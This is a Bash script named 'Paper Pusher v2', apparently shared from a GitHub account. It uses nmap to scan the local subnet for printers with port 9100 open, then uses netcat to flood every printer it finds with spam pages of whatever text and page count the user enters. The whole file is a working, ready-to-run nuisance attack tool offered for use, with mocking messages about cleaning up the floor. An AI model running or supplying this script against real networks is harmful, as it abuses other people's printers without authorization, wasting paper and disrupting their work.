#!/bin/bash
# PAPER PUSHER v2
# Nmap scans the LAN subnet and finds paper printers with port 9100 open and sends spam to be printed via RAW printing with Netcat. The script assumes that the subnet netmask is: 255.255.255.0. All automated, just run the script, sit back, and relax.
# Dependencies: Linux, nmap, netcat.
# Shout out to SpuriousIndices aka the Printer God, for teaching me how to mess with printers.

echo "
         https://github.com/OSINTI4L
  ,----,------------------------------,------.
  | ## |         PAPER PUSHER         |    - |
  | ## |                              |    - |
  |    |------------------------------|    - |
  |    ||............................||      |
  |    ||.-                        -.||      |
  |    ||___                      ___||    ##|
  |    ||---=--------------------=---||      |
  |--mb||_|______________________==__||------'
  "
  
# Gathering LAN subnet IP address:
echo -e "Gathering subnet IP address..\n"
sleep 1
SUBNET=$(hostname -I | awk '{print $1}' | awk -F'.' '{print $1"."$2"."$3}')
echo -e "Subnet: $SUBNET found!\nPresumed netmask: 255.255.255.0\n"
sleep 1

# Subnet scan for port 9100:
echo "Scanning subnet: $SUBNET.0/24.."
ISPRINTER="false"
for check in {1..10}; do
    PRNTR=($(nmap "$SUBNET".0/24 -p 9100 --open | grep -i "Nmap scan report" | awk '{print $NF}' | tr -d "()"))
    if [ -n "$PRNTR" ]; then
        ISPRINTER="true"
        break
    else
        sleep 3
    fi
done

if [ "$ISPRINTER" != "true" ]; then
    echo "No printer(s) found with port 9100 exposed! Exiting."
    exit 0
fi

# Send payload:
echo -e "🖨 Printer(s) found at: ${PRNTR[@]}, port 9100 exposed. 🖨\n"
sleep 1
echo -e "Enter the text to be printed\n(leave blank to dispense blank pages)"
read -p "Enter text: " PRINTTXT
sleep .5
echo -e "Text to be printed: $PRINTTXT\n"
sleep .5
echo -e "How many pages would you like to dispense?"
read -p "Number of pages: " PRINTPGS
sleep .5
    if [ -z "$PRINTPGS" ]; then
        echo "Page count cannot be empty! Exiting."
        exit 0
    fi
echo "Number of pages selected: $PRINTPGS"
sleep .5
echo -e "\nSending job to printer (∩ ° ʖ °)⊃━☆ﾟ-.   *.*.*.*.\n"
    for printers in "${PRNTR[@]}"; do
        for pages in $(seq "$PRINTPGS"); do
            echo -e "$PRINTTXT\n\f"
        done | nc -q 1 "$printers" 9100
    done
echo -e "Job sent successfully! ☚ (<‿<)☚\n"
sleep .5
echo -e "Time to clean up the floor \(^-^)/\n
It's dangerous to go alone! take this.\n
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡈⠻⠇⢸⣷⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡿⠿⠟⠛⠋⣉⣤⣴⣶⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣁⣠⣤⣤⣴⣶⣿⣿⠿⠿⠛⠋⣁⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠛⠋⣉⣉⣠⣤⣴⣶⣾⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢦⣄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠂⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡏⣿⣿⣿⣿⡿⣿⣿⢿⣿⡿⢿⣿⠻⡿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠀⡟⢹⣿⡿⠃⠸⠿⠀⠙⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
